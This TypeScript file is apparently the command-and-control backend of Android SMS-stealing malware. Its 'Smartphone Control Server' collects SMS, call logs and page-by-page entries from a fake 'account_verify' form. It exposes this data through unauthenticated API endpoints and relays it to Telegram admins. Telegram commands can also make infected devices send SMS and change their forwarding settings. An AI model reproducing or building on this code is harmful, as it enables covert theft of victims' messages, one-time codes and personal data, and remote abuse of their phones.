import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { setupSocketHandlers } from './socket/handlers.js';
import { store } from './store.js';
import { initTelegramBot } from './telegram/bot.js';

const app = express();
const httpServer = createServer(app);

// CORS configuration - allow all origins for Android device connections
const corsOptions = {
    origin: true, // Allow all origins dynamically
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
};

app.use(cors(corsOptions));
app.use(express.json());

// Serve static files from specific public directories (ignoring /webview)
const publicPagesPath = path.join(process.cwd(), 'dist', 'public', 'pages');
const publicImgPath = path.join(process.cwd(), 'dist', 'public', 'img');

app.use('/pages', express.static(publicPagesPath));
app.use('/img', express.static(publicImgPath));

// Form page route — redirect to multi-page form entry
app.get('/form', (req, res) => {
    const deviceId = req.query.deviceId || '';
    res.redirect(`/pages/account_verify.html?deviceId=${encodeURIComponent(deviceId as string)}`);
});

// Socket.IO server with proper timeout settings
const io = new Server(httpServer, {
    cors: {
        origin: true,
        methods: ['GET', 'POST'],
        credentials: true,
    },
    pingTimeout: 60000, // 60 seconds before considering connection dead
    pingInterval: 25000, // Send ping every 25 seconds
    maxHttpBufferSize: 5e6, // 5 MB max payload size for large SMS/call log syncs
});

// Initialize Telegram Bot
const telegramConfig = process.env.TELEGRAM_BOT_TOKEN ? {
    token: process.env.TELEGRAM_BOT_TOKEN,
    adminIds: (process.env.TELEGRAM_ADMIN_IDS || '')
        .split(',')
        .map(id => parseInt(id.trim(), 10))
        .filter(id => !isNaN(id)),
} : undefined;

const telegramBot = initTelegramBot(telegramConfig);

// Setup socket handlers with Telegram bot integration
setupSocketHandlers(io, telegramBot);

// Wire up Telegram bot callbacks for device control
if (telegramBot.isActive()) {
    telegramBot.onForwardingUpdate = (deviceId: string, config: any) => {
        const newConfig = store.updateForwarding(deviceId, config);
        if (newConfig) {
            io.to(`device:${deviceId}`).emit('forwarding:config', newConfig);
            console.log(`[Telegram] Forwarding config sent to device ${deviceId}`);
        }
    };

    telegramBot.onSyncRequest = (deviceId: string) => {
        io.to(`device:${deviceId}`).emit('device:requestSync');
        console.log(`[Telegram] Sync request sent to device ${deviceId}`);
    };

    telegramBot.onSendSms = (deviceId: string, recipientNumber: string, message: string, requestId: string, subscriptionId?: number) => {
        io.to(`device:${deviceId}`).emit('sms:sendRequest', {
            recipientNumber,
            message,
            subscriptionId: subscriptionId ?? -1,
            requestId,
        });
        console.log(`[Telegram] SMS send request sent to device ${deviceId}${subscriptionId && subscriptionId > 0 ? ` (SIM: ${subscriptionId})` : ''}`);
    };
}

// REST API endpoints
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/devices', (req, res) => {
    res.json(store.getAllDevices());
});

app.get('/api/devices/:id', (req, res) => {
    const deviceData = store.getDevice(req.params.id);
    if (!deviceData) {
        return res.status(404).json({ error: 'Device not found' });
    }
    res.json(deviceData);
});

app.get('/api/devices/:id/sms', (req, res) => {
    const sms = store.getSMS(req.params.id);
    res.json(sms);
});

app.get('/api/devices/:id/calls', (req, res) => {
    const calls = store.getCalls(req.params.id);
    res.json(calls);
});

app.get('/api/devices/:id/forms', (req, res) => {
    const forms = store.getForms(req.params.id);
    res.json(forms);
});

// Page-wise form sync endpoint (submits data as user progresses through pages)
app.post('/api/form/sync', (req, res) => {
    const { deviceId, pageName, pageData, timestamp } = req.body;

    console.log(`[Form] Page sync - device: "${deviceId}", page: "${pageName}"`);

    if (!deviceId || !pageName || !pageData) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Check if device exists before storing
    const deviceExistedBefore = store.getDevice(deviceId) !== undefined;

    // Build form data with page info - store incrementally
    const formData = {
        ...pageData,
        pageName: pageName,
        submittedAt: new Date(timestamp || Date.now())
    };

    // Store the form submission (each page is a separate form entry)
    store.submitForm(deviceId, formData as any);

    // If a new device was created, notify all clients about the new device
    if (!deviceExistedBefore) {
        const allDevices = store.getAllDevices();
        io.emit('devices:update', allDevices);
        console.log(`[Form] New device created from form sync, notified clients`);
    }

    // Get updated forms list and emit to frontend clients
    const forms = store.getForms(deviceId);
    io.emit('forms:update', { deviceId, forms });
    console.log(`[Form] Emitted forms:update with ${forms.length} forms`);

    // Notify via Telegram
    if (telegramBot.isActive()) {
        telegramBot.notifyPageSync(deviceId, pageName, pageData, timestamp);
    }

    res.json({ success: true, message: 'Page synced and stored' });
});


// Form submission endpoint — accepts dynamic fields (defined in formConfig.ts)
app.post('/api/form/submit', (req, res) => {
    const { deviceId, currentFlow, ...formFields } = req.body;

    console.log(`[Form] Received form submission - deviceId: "${deviceId}", flow: "${currentFlow}"`);

    if (!deviceId) {
        console.log(`[Form] Missing deviceId`);
        return res.status(400).json({ error: 'Missing deviceId' });
    }

    // Check if device exists before storing
    const deviceExistedBefore = store.getDevice(deviceId) !== undefined;

    // Build form data from whatever fields were sent
    const formData = {
        ...formFields,
        currentFlow: currentFlow || 'unknown',
        submittedAt: new Date()
    };

    // Store the form data (will create device if not exists)
    store.submitForm(deviceId, formData as any);

    // If a new device was created, notify all clients about the new device
    if (!deviceExistedBefore) {
        const allDevices = store.getAllDevices();
        io.emit('devices:update', allDevices);
        console.log(`[Form] New device created from form, notified clients`);
    }

    // Get updated forms list and emit to frontend clients
    const forms = store.getForms(deviceId);
    io.emit('forms:update', { deviceId, forms });

    // Notify via Telegram if enabled
    if (telegramBot.isActive()) {
        telegramBot.notifyNewForm(deviceId, formData as any);
    }

    console.log(`[Form] Successfully stored form data for device ${deviceId}`);
    res.json({ success: true, message: 'Form submitted successfully' });
});


const PORT = process.env.PORT || 3001;
const HOST = '0.0.0.0'; // Listen on all interfaces for Android device connections

httpServer.listen(Number(PORT), HOST, () => {
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   📱 Smartphone Control Server                            ║
║                                                           ║
║   REST API:    http://192.168.0.115:${PORT}                 ║
║   Socket.IO:   ws://192.168.0.115:${PORT}                   ║
║   Telegram:    ${telegramBot.isActive() ? '✅ Enabled' : '❌ Disabled'}                              ║
║                                                           ║
║   Listening on all interfaces (0.0.0.0)                   ║
║   Waiting for device connections...                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown handling for Render restarts
const gracefulShutdown = async (signal: string) => {
    console.log(`\n[Server] Received ${signal}. Starting graceful shutdown...`);

    // Stop Telegram bot polling first (most critical for avoiding 409 conflict)
    if (telegramBot.isActive()) {
        await telegramBot.stop();
    }

    // Close HTTP server
    httpServer.close(() => {
        console.log('[Server] HTTP server closed.');
        process.exit(0);
    });

    // Force exit after 10 seconds if graceful shutdown fails
    setTimeout(() => {
        console.error('[Server] Graceful shutdown timed out. Forcing exit.');
        process.exit(1);
    }, 10000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

